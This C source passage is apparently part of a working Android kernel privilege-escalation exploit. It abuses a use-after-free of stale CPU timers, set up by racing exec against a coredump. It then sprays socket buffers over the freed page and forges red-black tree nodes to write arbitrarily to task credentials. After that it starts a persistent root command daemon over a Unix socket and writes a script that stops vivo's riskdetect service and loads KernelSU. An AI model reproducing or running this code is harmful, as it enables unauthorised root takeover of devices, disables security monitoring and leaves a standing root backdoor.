 * 做法：一个 CLONE_VM 兄弟进程（共享 mm、独立 signal）在 exec 线程进入
 * 内核后主动 SIGSEGV，do_coredump -> coredump_wait 就会把 core_state 挂上；
 * 被 zap 的 exec 线程此刻正卡在不可打断的 mmap_read_lock 里，等它拿到锁
 * 之后必然看到 core_state != NULL，返回 -EINTR，+0x6a4 的
 * posix_cpu_timers_exit 被整段跳过 —— 定时器留在 cpu_timers 里。
 *
 * RLIMIT_CORE 设 0：coredump_wait 在 limit 检查（binfmt->min_coredump）之前
 * 就已经跑完，core_state 该生效的已经生效，同时不会真的写出几百 MB 的 core。
 */
static int crasher_fn(void *x)
{
    const char *trig = getenv("CRASH_TRIGGER");
    const char *cv;
    const char *ds = getenv("CRASH_DELAY_US");
    long delay = ds ? atol(ds) : 0;
    struct rlimit rl = {0, 0};
    (void)x;

    /*
     * 必须独占一个 CPU：locker 用 mprotect 循环，一次调用要占住 CPU 好几毫秒，
     * 如果 crasher 和 locker 同核，等它被调度上来时 exec 早就过了 exec_mmap。
     * CPU 1/3 给两个 locker，2 给 exec 线程和 leader，crasher 用 4。
     */
    pin(4);
    /* dumpable 是 mm->flags 上的标志，兄弟进程写等于给整个 mm 打开 */
    syscall(SYS_prctl, PR_SET_DUMPABLE, 1, 0, 0, 0);
    setrlimit(RLIMIT_CORE, &rl);

    if (trig && !strcmp(trig, "enter"))
    {
        /* 忙等：exec 线程置位后几条指令就进 execve，任何 yield 都会太晚 */
        while (!atomic_load(&g_exec_enter))
            ;
    }
    else if (trig && !strcmp(trig, "go"))
    {
        while (!atomic_load(&g_go))
            sched_yield();
    }
    else
    {
        int tgid = atomic_load(&g_target_tgid);
        long spins = 0;

        /*
         * de_thread 会先 zap 掉 leader，再等它真正退出。leader 消失的
         * 那一刻就是 exec 线程即将进入 unshare_files/exec_mmap 的信号。
         * 交换 tid 之后 tgkill 会重新命中，所以一旦抓到 ESRCH 就锁存。
         */
        for (;;)
        {
            long r = syscall(SYS_tgkill, tgid, tgid, 0);

            if (r < 0 && errno == ESRCH)
                break;
            if (atomic_load(&g_go) && ++spins > 4000000L)
                break; /* 兜底：没抓到就按 g_go 走 */
            sched_yield();
        }
    }
    if (delay > 0)
    {
        struct timespec ts;

        ts.tv_sec = delay / 1000000;
        ts.tv_nsec = (delay % 1000000) * 1000;
        nanosleep(&ts, NULL);
    }
    if (getenv("CRASH_LOG"))
        logf("[crash] firing sigsegv\n");
    *(volatile unsigned long *)0 = 0xdead;
    _exit(0);
}
static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    /* Keep the target paused until the parent has captured V and armed the
     * spray; the free still has not happened at this point. */
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < (unsigned)atomic_load(&g_locker_need))
        sched_yield();
    {
        const char *sv = getenv("EXEC_SPIN");
        unsigned long spin = sv ? strtoul(sv, NULL, 0) : 5000000UL;

        for (volatile unsigned long i = 0; i < spin; i++)
            __asm__ volatile("" ::: "memory");
    }
    atomic_store(&g_exec_enter, 1);
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    const char *ev;
    int lockers = LOCKERS;

    ev = getenv("LOCKERS");
    if (ev)
        lockers = atoi(ev);
    if (lockers < 0)
        lockers = 0;
    atomic_store(&g_locker_need, lockers);
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    /*
     * PAD_FDS 把 files_struct 撑大。exec 的 unshare_files() -> dup_fd()
     * 是线性拷贝，能把 de_thread 到 exec_mmap 之间的窗口拉长，给 crasher
     * 留出设置 core_state 的时间。必须在 helper 起来之后再铺，否则
     * clone() 没有 CLONE_FILES，每个 helper 都会复制一遍这张大表。
     */
    for (int i = 0; i < lockers; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    ev = getenv("KILLER");
    if (!ev || atoi(ev))
    {
        if (spawn_vm_helper(killer_fn) < 0)
            _exit(112);
    }
    ev = getenv("EXECFAIL");
    if (ev && !strcmp(ev, "coredump") && spawn_vm_helper(crasher_fn) < 0)
        _exit(113);
    ev = getenv("PAD_FDS");
    if (ev)
    {
        int want = atoi(ev);
        int i;

        for (i = 0; i < want; i++)
            if (open("/dev/null", O_RDONLY) < 0)
                break;
        logf("[target] padded fds=%d (want %d)\n", i, want);
    }
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    ev = getenv("LEADER_MPROTECT");
    if (ev && atoi(ev) && g_frag_base && g_frag_len)
    {
        /*
         * de_thread 会先给 leader 发 SIGKILL 再等它退出。mprotect 不检查
         * 信号，50000 个 VMA 的一趟要跑毫秒级，leader 就死不利索，
         * de_thread 一直等在 while (sig->notify_count) 里 —— 这正是
         * crasher 设置 core_state 的窗口。
         */
        int prot = PROT_READ;

        for (;;)
        {
            syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
            prot = prot == PROT_READ ? PROT_NONE : PROT_READ;
        }
    }
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 50000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

/*
 * Stale timer node layout inside the reclaimed order-1 page.
 *   zero: parent=0 -> rb_erase writes 0 to target.
 *   fake: parent=node -> rb_erase writes node to target (task->cred); the
 *         fake cred fields are overlaid at the same offset by run_plant.
 */
static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

/*
 * mode=4：任意写（写任意 value 到任意 target）。
 *
 * rb_erase 在 node->rb_right == NULL 时走
 *     __rb_change_child(node, node->rb_left, parent, root)
 * parent 取自 node->__rb_parent_color & ~3。__rb_change_child 的逻辑是
 *     if (parent->rb_left == old) parent->rb_left  = new;
 *     else                       parent->rb_right = new;
 * 把 parent 设成 target - 0x08、new（rb_left）设成 value，就等价于
 * 「*(u64 *)target = value」。parent->rb_left 读的是 target-0x10，只读一次，
 * 正常不会等于 node，于是走 rb_right 分支，落点正好是 target。
 *
 * leftmost 维护（rb_erase_cached 先跑 rb_next）也安全：right==NULL 时
 * rb_next 沿 parent 链走一步，比较 parent->rb_right 与 node 不等就返回 NULL，
 * 不会再解引用。
 */
static void build_payload_aw(unsigned char *buf, size_t off,
                             unsigned long long target, unsigned long long value)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = target - 0x08; /* parent */
    *(unsigned long long *)(buf + off + 0x08) = value;         /* right = child */
    *(unsigned long long *)(buf + off + 0x10) = 0;             /* left  = NULL  */
}

/*
 * KernelSU handoff.
 *
 * ksud is found by content, not by package name: any installed manager that
 * ships lib/arm64/libksud.so is valid, so forks and renamed builds work with
 * no rebuild.  UserService.install() already copies the first hit to
 * /data/local/tmp/ksud from the shell domain; the find fallback covers a
 * manual push or a copy that failed.
 *
 * The KMI comes from uname -r (6.1.157-android14-11-... -> android14-6.1);
 * the conf value is only a fallback for release strings without an androidN
 * tag.  late-load is tried as a ladder because ksud exits 0 even when it
 * silently refuses (wrong KMI, manager not bound), so only /proc/modules
 * decides whether an attempt worked.
 */
/*
 * rootd：漏洞成功后常驻的 root 执行端。
 *
 * 它在 commit_creds() 之后 fork 出来，手里是一份内核新分配的真 cred
 * （uid 0 + 全 caps + sid 1 + permissive），所以：
 *   - 父进程 park/退出都不影响它；
 *   - 重启前一直可用，KSU 怎么折腾都不会把这次开机的 root 弄丢。
 *
 * 设计上刻意"笨"：单线程、一次一条命令、不做协议扩展。任何失败都只打一行
 * 日志然后返回，绝不 park、绝不 exit，保证不影响调用它的漏洞路径。
 */
static void rootd_serve(void)
{
    int sfd;
    struct sockaddr_un sa;

    signal(SIGPIPE, SIG_IGN);
    setsid();

    sfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sfd < 0)
    {
        logf("[rootd] socket failed errno=%d\n", errno);
        return;
    }
    (void)unlink(ROOTD_PATH);
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    strncpy(sa.sun_path, ROOTD_PATH, sizeof(sa.sun_path) - 1);
    if (bind(sfd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
    {
        logf("[rootd] bind failed errno=%d\n", errno);
        close(sfd);
        return;
    }
    /* 只给 shell(2000) 用：App 自己连不上，必须经 Shizuku 那层代理。 */
    (void)chmod(ROOTD_PATH, 0600);
    (void)chown(ROOTD_PATH, 2000, 2000);
    if (listen(sfd, 4) < 0)
    {
        logf("[rootd] listen failed errno=%d\n", errno);
        close(sfd);
        return;
    }
    logf("[rootd] listening %s uid=%d euid=%d\n", ROOTD_PATH, (int)getuid(),
         (int)geteuid());

    for (;;)
    {
        struct ucred cr;
        socklen_t cl = sizeof(cr);
        char cmd[4096];
        size_t n = 0;
        int c = accept(sfd, NULL, NULL);
        pid_t pid;
        int st = 0;

        if (c < 0)
        {
            usleep(100000);
            continue;
        }
        if (getsockopt(c, SOL_SOCKET, SO_PEERCRED, &cr, &cl) == 0 &&
            cr.uid != 0 && cr.uid != 2000)
        {
            logf("[rootd] reject peer uid=%d\n", (int)cr.uid);
            close(c);
            continue;
        }
        while (n + 1 < sizeof(cmd))
        {
            char ch;
            ssize_t r = read(c, &ch, 1);

            if (r <= 0 || ch == '\n')
                break;
            cmd[n++] = ch;
        }
        cmd[n] = 0;
        if (!n)
        {
            close(c);
            continue;
        }
        logf("[rootd] exec: %s\n", cmd);
        pid = fork();
        if (pid == 0)
        {
            int dn = open("/dev/null", O_RDWR);

            dup2(c, 0);
            dup2(c, 1);
            dup2(c, 2);
            if (dn >= 0 && dn > 2)
                close(dn);
            execl("/system/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(127);
        }
        if (pid > 0)
            (void)waitpid(pid, &st, 0);
        (void)!write(c, "__END__\n", 8);
        close(c);
    }
}

/* 客户端：timer rootd '<cmd>'，在 shell/2000 环境下用。 */
static int rootd_client(const char *cmd)
{
    int fd;
    struct sockaddr_un sa;
    char buf[8192];
    char *acc;
    size_t used = 0, cap = 1 << 20;
    int found = 0;

    fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0)
    {
        fprintf(stderr, "rootd: socket: %s\n", strerror(errno));
        return 2;
    }
    memset(&sa, 0, sizeof(sa));
    sa.sun_family = AF_UNIX;
    strncpy(sa.sun_path, ROOTD_PATH, sizeof(sa.sun_path) - 1);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
    {
        fprintf(stderr, "rootd: connect %s: %s\n", ROOTD_PATH, strerror(errno));
        close(fd);
        return 2;
    }
    (void)!write(fd, cmd, strlen(cmd));
    (void)!write(fd, "\n", 1);

    acc = malloc(cap);
    if (!acc)
    {
        close(fd);
        return 2;
    }
    for (;;)
    {
        ssize_t r = read(fd, buf, sizeof(buf));

        if (r <= 0)
            break;
        if (used + (size_t)r < cap)
        {
            memcpy(acc + used, buf, (size_t)r);
            used += (size_t)r;
        }
        if (used >= 8 && !memcmp(acc + used - 8, "__END__\n", 8))
        {
            used -= 8;
            found = 1;
            break;
        }
    }
    close(fd);
    if (used)
        (void)!write(STDOUT_FILENO, acc, used);
    free(acc);
    return found ? 0 : 1;
}

static void write_ksu_script(void)
{
    const char *path = "/data/local/tmp/ksu_stage.sh";
    FILE *f = fopen(path, "w");

    if (!f)
        return;
    fputs("#!/system/bin/sh\n", f);
    fputs("[ -x /data/local/tmp/sud/sud ] && /data/local/tmp/sud/sud --daemon --replace\n", f);
    fputs("echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n", f);
    /*
     * vivo：内核侧把 sys_exit 回调表清了，用户态还有 riskdetect 会盯着。
     * 脚本本身就是 uid=0 在跑，先停掉它，再 late-load。非 vivo 不会进来。
     */
    if (vivo_disarm_enabled())
    {
        fputs("stop riskdetect 2>/dev/null; setprop ctl.stop riskdetect 2>/dev/null\n", f);
        fputs("echo \"[ksu] vivo: riskdetect stop attempted\"\n", f);
    }
    fputs("grep -E '^(Cap|Seccomp)' /proc/self/status\n", f);
    fputs("KSUD=/data/local/tmp/ksud\n", f);
    /* /data/app is 0771 for shell, so find cannot list it; pm knows the exact
     * path and a direct stat on it is allowed. */
    fputs("if [ ! -x \"$KSUD\" ]; then\n", f);
    fputs("  for p in me.weishu.kernelsu me.weishu.kernelsu.pr"
          " com.rifsxd.ksunext com.sukisu.ultra com.resukisu.resukisu"
          " com.kowx712.supermanager; do\n", f);
    fputs("    A=$(pm path \"$p\" 2>/dev/null | head -1 | cut -d: -f2)\n", f);
    fputs("    [ -n \"$A\" ] || continue\n", f);
    fputs("    D=$(dirname \"$A\")\n", f);
    fputs("    for abi in arm64 arm; do\n", f);
    fputs("      [ -x \"$D/lib/$abi/libksud.so\" ] && {"
          " KSUD=\"$D/lib/$abi/libksud.so\"; break 2; }\n", f);
    fputs("    done\n", f);
    fputs("  done\n", f);
    fputs("fi\n", f);
    fputs("if [ ! -x \"$KSUD\" ]; then\n", f);
    fputs("  KSUD=$(find /data/app -name libksud.so -path '*/lib/arm64/*'"
          " 2>/dev/null | head -1)\n", f);
    fputs("fi\n", f);
    fputs("if [ ! -x \"$KSUD\" ]; then\n", f);
    fputs("  KSUD=$(find /data/app -name libksud.so 2>/dev/null | head -1)\n", f);
    fputs("fi\n", f);
    fputs("[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n", f);
    fputs("[ -x \"$KSUD\" ] || KSUD=/data/local/tmp/timer-ksud\n", f);
    fputs("if [ ! -x \"$KSUD\" ]; then\n", f);
    fputs("  echo '[ksu] ksud missing'; echo KSU_MISSING; exit 1\n", f);
    fputs("fi\n", f);
    fputs("chmod 755 \"$KSUD\" 2>/dev/null\n", f);
    fputs("echo \"[ksu] ksud=$KSUD size=$(ls -l \"$KSUD\" 2>/dev/null |"
          " awk '{print $5}')\"\n", f);
    fputs("echo \"[ksu] ver=$(\"$KSUD\" --version 2>&1 | head -1)\"\n", f);
    fputs("KVER=$(uname -r | cut -d. -f1-2)\n", f);
    fputs("AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n", f);
    fputs("KMI=\"${AVER}-${KVER}\"\n", f);
    fprintf(f, "[ -n \"$AVER\" ] || KMI='%s'\n", g_cfg.ksu_kmi);
    fputs("echo \"[ksu] kmi=$KMI uname=$(uname -r)\"\n", f);
    /* .../<pkg>-<hash>==/lib/arm64/libksud.so: a package name cannot contain
     * a hyphen, so the last one starts the install-dir suffix.  The sidecar
     * wins when ksud was copied out of that directory. */
    fputs("PKG=$(cat /data/local/tmp/ksud.pkg 2>/dev/null | head -1)\n", f);
    fputs("[ -n \"$PKG\" ] || PKG=$(basename \"$(dirname \"$(dirname \"$KSUD\")\")\" |"
          " sed 's/-[^-]*==$//')\n", f);
    fputs("case \"$PKG\" in *.*) ;; *) PKG= ;; esac\n", f);
    fputs("echo \"[ksu] pkg=${PKG:-unknown}\"\n", f);
    /*
     * 0.49：如果 /data/local/tmp/kernelsu.ko 存在，直接 insmod —— 这是给自己
     * 编的模块留的入口。insmod 的报错比 ksud 的 rc 有用得多：
     *   invalid module format        → vermagic 不对
     *   disagrees about version ...  → CRC 不对
     * 失败时把 dmesg 相关行一起打出来，省得上机后再猜。
     */
    fputs("KO=/data/local/tmp/kernelsu.ko\n", f);
    fputs("if [ -f \"$KO\" ]; then\n", f);
    fputs("  echo \"[ko] $KO size=$(ls -l \"$KO\" | awk '{print $5}')\"\n", f);
    fputs("  echo \"[ko] $(tr -d '\\0' < \"$KO\" 2>/dev/null |"
          " grep -o 'vermagic=[0-9A-Za-z._-]*' | head -1)\"\n", f);
    fputs("  insmod \"$KO\" 2>&1\n", f);
    fputs("  echo \"[ko] insmod rc=$?\"\n", f);
    fputs("  grep -q '^kernelsu ' /proc/modules && { echo KSU_LOADED; exit 0; }\n", f);
    fputs("  dmesg 2>/dev/null | tail -8\n", f);
    fputs("fi\n", f);
    fputs("loaded() { grep -q '^kernelsu ' /proc/modules 2>/dev/null; }\n", f);
    fputs("wait_load() {\n", f);
    fputs("  i=0\n", f);
    fputs("  while [ $i -lt 20 ]; do\n", f);
    fputs("    loaded && { echo KSU_LOADED; return 0; }\n", f);
    fputs("    i=$((i+1)); sleep 0.5\n", f);
    fputs("  done\n", f);
    fputs("  return 1\n", f);
    fputs("}\n", f);
    fputs("try_load() {\n", f);
    fputs("  echo \"[ksu] try: late-load $*\"\n", f);
    fputs("  \"$KSUD\" late-load \"$@\" 2>&1\n", f);
    fputs("  rc=$?\n", f);
    fputs("  echo \"[ksu] rc=$rc\"\n", f);
    fputs("  [ $rc -eq 0 ] || return 1\n", f);
    fputs("  wait_load\n", f);
    fputs("}\n", f);
    fputs("if loaded; then\n", f);
    fputs("  echo '[ksu] already loaded'; echo KSU_LOADED; exit 0\n", f);
    fputs("fi\n", f);
    fputs("if [ -n \"$PKG\" ]; then\n", f);
    fputs("  try_load --kmi \"$KMI\" --allow-shell --package-name \"$PKG\"\n", f);
    fputs("fi\n", f);
    fputs("if ! loaded; then try_load --kmi \"$KMI\" --allow-shell; fi\n", f);
    fputs("if ! loaded; then try_load --kmi \"$KMI\"; fi\n", f);
    fputs("if ! loaded; then try_load; fi\n", f);
    fputs("if loaded; then echo KSU_LOADED; else echo KSU_MISSING;"
          " dmesg 2>/dev/null | tail -15; fi\n", f);
    fputs("true\n", f);
    fputs("echo \"[ksu] enforce=$(getenforce)\"\n", f);
    fclose(f);
    (void)chmod(path, 0755);
}

static int selinux_enforcing(void)
{
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    int v = -1;

    if (f)
    {
        if (fscanf(f, "%d", &v) != 1)
            v = -1;
        fclose(f);
    }
    logf("[ksu] selinux enforce=%d\n", v);
    return v;
}

static int read_panic_on_warn(void)
{
    FILE *f = fopen("/proc/sys/kernel/panic_on_warn", "r");
    int value = -1;

    if (f)
    {
        if (fscanf(f, "%d", &value) != 1)
            value = -1;
        fclose(f);
    }
    /*
     * -1 = 读不到。父进程在 shell 域时 /proc/sys/kernel/panic_on_warn 是
     * root-only，必然读不到；这不代表值异常，只是没法先验。真正能证明
     * "已经清掉"的是后面那次 fake cred 的 WARN 没有把机器打死。
     */
    if (value < 0)
        logf("[ksu] panic_on_warn=unreadable (shell domain)\n");
    else
        logf("[ksu] panic_on_warn=%d\n", value);
    return value;
}

struct plant_res
{
    unsigned long long A;
    int ok;
    int retry;
};

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw);

static int stage_write(unsigned long long target, int mode,
                       const char *what, unsigned char *raw,
                       struct plant_res *out)
{
    struct plant_res r;

    for (int attempt = 1; attempt <= 3; attempt++)
    {
        memset(&r, 0, sizeof(r));
        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
             mode == 2 ? "fake" : "zero", attempt);
        run_plant(target, 1, mode, &r, raw);
        if (r.ok)
        {
            if (out)
                *out = r;
            return 0;
        }
        if (!r.retry)
        {
            logf("[-] stage %s failed\n", what);
            return -1;
        }
    }
    logf("[-] stage %s exhausted retries\n", what);
    return -1;
}

#define SPRAY_THREADS 8
#define SPRAY_SOCKS 2048
#define SPRAY_PRE 2000
#define SPRAY_POST 10000
static _Atomic int g_burst, g_burst2, g_stop_spray;
static int g_pool[SPRAY_SOCKS][2];
static int g_pool_n;
static int g_rawfd[8] = {-1, -1, -1, -1, -1, -1, -1, -1};
static _Atomic int g_spray_tids[SPRAY_THREADS];

struct spray_arg
{
    unsigned char *payload;
    int sock_first, sock_count, cpu, idx;
};

static void ensure_pool(void)
{
    int snd = 16 << 20;

    if (g_pool_n)
        return;
    for (int i = 0; i < SPRAY_SOCKS; i++)
    {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_pool[i]))
            break;
        setsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &snd, sizeof(snd));
        setsockopt(g_pool[i][1], SOL_SOCKET, SO_RCVBUF, &snd, sizeof(snd));
        g_pool_n++;
    }
    /*
     * RLIMIT_NOFILE is raised in main(), but a device that caps the hard limit
     * still leaves fewer pairs than SPRAY_SOCKS.  Below two sockets per spray
     * thread the modulo divisor in spray_thread() would be zero (SIGFPE), and
     * too few sockets means the burst cannot hold enough pages anyway.
     */
    if (g_pool_n < SPRAY_THREADS * 2)
        park_forever("too few spray sockets (RLIMIT_NOFILE?)");
    logf("[+] spray pool=%d sockets\n", g_pool_n);
}

static void ensure_raw(void)
{
    for (int cpu = 0; cpu < 8; cpu++)
    {
        char path[128];

        if (g_rawfd[cpu] >= 0)
            continue;
        snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        g_rawfd[cpu] = open(path, O_RDONLY | O_NONBLOCK);
    }
}

static long read_fd(int fd, unsigned char *buf, size_t cap)
{
    size_t tot = 0;

    if (fd < 0)
        return 0;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);

        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    return (long)tot;
}

/*
 * A page_alloc for the victim pfn is only a hit if one of our spray threads
 * performed it.  A system allocation can take the freed page first; reaping
 * that node would treat the system page contents as an rb_node and panic.
 */
static int scan_page_alloc_ours(const unsigned char *b, size_t n,
                                unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        int pid;

        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        pid = (int)u32(b, i - 4);
        for (int j = 0; j < SPRAY_THREADS; j++)
            if (pid == atomic_load(&g_spray_tids[j]))
                return 1;
    }
    return 0;
}

/*
 * Same scan without the "is this one of our spray threads" test.  Only used to
 * explain a miss: the pid that did allocate the page tells us whether we lost
 * the race to another allocation or the record never arrived.
 */
static int scan_page_alloc_any(const unsigned char *b, size_t n,
                               unsigned long long pfn, int *out_pid)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        *out_pid = (int)u32(b, i - 4);
        return 1;
    }
    return 0;
}

static void *spray_thread(void *x)
{
    struct spray_arg *a = x;
    int w = 0;

    atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
    pin(a->cpu);
    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
        sched_yield();
    /*
     * Do not hold this thread back: the freed slab page goes into the pcp list
     * of the CPU that ran do_exit(), and the fastest way to pull it back out is
     * an allocation on that same CPU.  g_cpu is where the target runs, so this
     * thread is the most likely winner, not a competitor to sideline.
     */
    /* Phase 1 covers the free that happens before the zombie is visible. */
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    /* Phase 2 is released when the parent sees the victim page free. */
    while (!atomic_load(&g_burst2) && !atomic_load(&g_stop_spray))
        sched_yield();
    while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE + SPRAY_POST)
    {
        int k = a->sock_first + (w % a->sock_count);

        (void)write(g_pool[k][0], a->payload, SOCKBUF);
        w++;
    }
    return NULL;
}

static void run_plant(unsigned long long target, int tag, int mode,
                      struct plant_res *res, unsigned char *raw)
{
    unsigned long long ptrs[NTIMERS];
    unsigned long long pfn = 0, slab_pfn = 0;
    unsigned char *payload = NULL;
    pthread_t th[SPRAY_THREADS];
    struct spray_arg args[SPRAY_THREADS];
    int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
    memset(res, 0, sizeof(*res));
    if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
    {
        logf("[-] plant%d pipe failed\n", tag);
        return;
    }
    pid_t T = fork();
    if (T < 0)
    {
        logf("[-] plant%d fork failed\n", tag);
        return;
    }
    if (T == 0)
    {
        close(ready_p[0]);
        close(ack_p[1]);
        close(tid_p[0]);
        close(timer_go[1]);
        g_ready_w = ready_p[1];
        g_ack_r = ack_p[0];
        g_tid_w = tid_p[1];
        g_timer_go_r = timer_go[0];
        run_target();
        _exit(115);
    }
    close(ready_p[1]);
    close(ack_p[0]);
    close(tid_p[1]);
    close(timer_go[0]);
    g_timer_go_w = timer_go[1];
    char ch;
    if (read(ready_p[0], &ch, 1) != 1)
    {
        logf("[-] plant%d trigger never ready\n", tag);
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        return;
    }
    trace_start();
    if (write(ack_p[1], "A", 1) != 1)
        logf("[-] ack failed\n");
    int etid = 0;
    if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
        logf("[-] exec tid not received\n");

    /*
     * The exec thread is paused after creating its 4096 timers.  Capture V,
     * the slab pfn and the linear-map base now, before the exec/free, so the
     * spray is already running when the victim slab returns to the buddy.
     */
    long n = read_cpu(g_cpu, raw, 48u << 20);
    unsigned long long kept[NTIMERS];
    unsigned long long V = 0, site0 = 0, fake_A = 0;
    unsigned long long vslab;
    int nrec, nkeep = 0, slab_own = 0, free_seen = 0;

    nrec = n > 0 ? scan_timer_allocs(raw, (size_t)n, etid, ptrs, NTIMERS,
                                     &site0)
                 : 0;
    if (!nrec || !site0)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
        return;
    }
    {
        int ns = 0, np = 0;
        unsigned long long base;

        base = plant_base(raw, (size_t)n, etid, ptrs, nrec, &ns, &np);
        if (!base)
            base = g_base;
        if (!base || base < 0xffffff0000000000ULL ||
            base > 0xfffffffffffff000ULL)
        {
            trace_stop();
            kill(T, SIGKILL);
            waitpid(T, NULL, 0);
            logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                 tag, base, ns, np, nrec);
            return;
        }
        g_base = base;
        /*
         * The linear map is [base, 0xfffffffffffff000) on this VA layout;
         * 4.19 with VA_BITS=39 randomises PAGE_OFFSET, so the KASLR'd base can
         * sit far above the 6.x 0xffffffc000000000 boundary.
         * physical RAM is sparse and extends well past 16 GiB, so do not
         * bound by RAM size.  A pointer outside this window is a stale
         * kmem record or a mis-scanned site collision and must not shift
         * the victim index.
         */
        for (int i = 0; i < nrec; i++)
            if (ptrs[i] >= base && ptrs[i] < 0xfffffffffffff000ULL)
                kept[nkeep++] = ptrs[i];
        logf("[+] plant%d base=%#llx slabs=%d pfns=%d recs=%d kept=%d\n",
             tag, base, ns, np, nrec, nkeep);
    }
    if (nkeep <= VICTIM_IDX)
    {
        trace_stop();
        kill(T, SIGKILL);
        waitpid(T, NULL, 0);
        logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
        return;
    }
    V = kept[VICTIM_IDX];
    vslab = V & ~0x1fffULL;
    for (int i = 0; i < nkeep; i++)
        if ((kept[i] & ~0x1fffULL) == vslab)
            slab_own++;
    pfn = (V - g_base) >> 12;
    slab_pfn = pfn & ~1ULL;
    /*
     * slide 的两条来源：
     *   ① conf 里有 timer_site：site0 是本次观测到的运行时调用点，
     *      减去静态值即得（原路径，最精确）。
     *   ② 没有 timer_site：plant_base 已经用 virt-(pfn<<12) 投票出线性映射
